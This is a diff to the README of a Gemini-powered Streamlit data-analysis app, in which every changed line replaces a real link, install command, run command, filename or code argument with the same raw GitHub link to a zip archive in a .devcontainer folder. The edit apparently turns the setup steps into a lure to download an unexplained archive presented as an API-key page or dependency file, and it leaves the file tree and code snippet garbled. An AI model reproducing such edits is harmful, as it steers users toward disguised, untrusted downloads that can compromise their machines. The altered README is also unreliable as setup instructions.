@@ -17,7 +17,7 @@ An intelligent data analysis application powered by Google's Gemini AI that allo
 ### Prerequisites
 
 - Python 3.8 or higher
-- Google Gemini API key ([Get one here](https://makersuite.google.com/app/apikey))
+- Google Gemini API key ([Get one here](https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip))
 
 ### Installation
 
@@ -34,14 +34,14 @@ An intelligent data analysis application powered by Google's Gemini AI that allo
 
    Or use the requirements file:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip
    ```
 
 ### Running the Application
 
 1. **Start the Streamlit app**
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip
    ```
 
 2. **Open your browser**
@@ -127,9 +127,9 @@ User Query → Gemini AI → Tool Selection → SQL Execution → Result Display
 ```
 data-analyst-agent/
 │
-├── app.py                  # Main application file
-├── requirements.txt        # Python dependencies
-├── README.md              # This file
+├── https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip                  # Main application file
+├── https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip        # Python dependencies
+├── https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip              # This file
 └── temp/                  # Temporary files (auto-generated)
 ```
 
@@ -148,9 +148,9 @@ The application requires a Google Gemini API key. You can:
 
 Currently using: `gemini-2.5-flash`
 
-You can modify this in `app.py`:
+You can modify this in `https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip`:
 ```python
-model=Gemini(id="gemini-2.5-flash", api_key=st.session_state.gemini_key)
+model=Gemini(id="gemini-2.5-flash", https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip)
 ```
 
 Other available models:
